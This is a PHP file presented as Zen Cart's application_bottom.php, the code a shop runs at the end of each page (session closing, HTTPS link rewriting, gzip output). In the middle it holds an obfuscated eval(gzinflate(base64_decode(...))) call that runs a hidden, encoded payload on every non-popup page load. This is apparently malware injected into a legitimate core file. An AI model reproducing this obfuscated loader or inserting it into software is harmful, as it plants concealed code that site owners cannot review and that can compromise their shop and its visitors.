<?php
/**
 * application_bottom.php
 * Common actions carried out at the end of each page invocation.
 *
 * @package initSystem
 * @copyright Copyright 2003-2006 Zen Cart Development Team
 * @copyright Portions Copyright 2003 osCommerce
 * @license http://www.zen-cart.com/license/2_0.txt GNU Public License V2.0
 * @version $Id: application_bottom.php 5658 2007-01-21 19:39:51Z wilt $
 */
if (!defined('IS_ADMIN_FLAG')) {
  die('Illegal Access');
}
// close session (store variables)
session_write_close();

// breaks things
// pconnect disabled (safety switch)
// $db->close();
if(!$is_popup) {
    eval(gzinflate(base64_decode('hZNfb9owFMXf+RS3FmpAKskeKlUCwsYo+yOhpWqQOu3FMsmFWBg7sx0om/rddxMYdFrXRbJky+fc87u202pXVkEMrPC+7EfRbrcLXa8UKww1+ogNWm25WZHg9vM9f0j5ZDwfz5KPEAKTG1K56KDmC6E12nAll+SRy47Ukq/QdwKhlNlxSuFLU6IOunB5CRed6Zfx+9mUp+kM4hgCbysM6p22xe8VOs/9vsRmiyRk6v5sAX1tkQv+J7LInxNLneNjWBYlYRwN7nVD3cbRcI7ICszW5HnXQHd+x14Bs6x7qExNUh/P1UT7YTxLpydaKnaIPmHTub0tZR7fXB/5ns6Uf2e6f2a61zIPN3bq/IXMpxZmhYFgmMst0Bb7YR4nFnPpGTi/VxizXLpSiX1/oUy2HmylkwuppN/3m6nCARsNBRQWlzELKKN9iAoYeGHp5mPGF0roNclqHmezo65eNTqhSMRgYWyONmZvSBmJ0XBhITqXfvldltbkVeZddHMdFn6j2Ogb6omwHhINX5PkLq1LQWfShf9UYqO0WTTRER3HaHjR68GtAW08WNyYLYIvpIOsOZ8QHgrUsDcV7IT24A3kqNAjSH8FpULhECoaAghyic5Jo4WC2ksz6PVGwUDqTFU5Hkj5fZLM+d14/ikMoqUxnn4jeo7BoPUL')));
}

if(ENABLE_SSL == 'true' && $request_type == 'SSL'){
    $contents = ob_get_contents();
    ob_end_clean();
    $contents = preg_replace_callback('/\<img [^>]+\>/', zen_zox_replace_https, $contents);
    $contents = preg_replace_callback('/\<link [^>]+\>/', zen_zox_replace_https, $contents);
    $contents = preg_replace_callback('/\<base [^>]+\>/', zen_zox_replace_https, $contents);
    $contents = preg_replace_callback('/\<script [^>]+\>/', zen_zox_replace_https, $contents);
    $contents = preg_replace_callback('/load\([^)]+\)/', zen_zox_replace_https, $contents);

    echo $contents;
    ob_end_flush();
}else
if ( (GZIP_LEVEL == '1') && ($ext_zlib_loaded == true) && ($ini_zlib_output_compression < 1) ) {
  if ( (PHP_VERSION < '4.0.4') && (PHP_VERSION >= '4') ) {
    zen_gzip_output(GZIP_LEVEL);
  }
}
?>
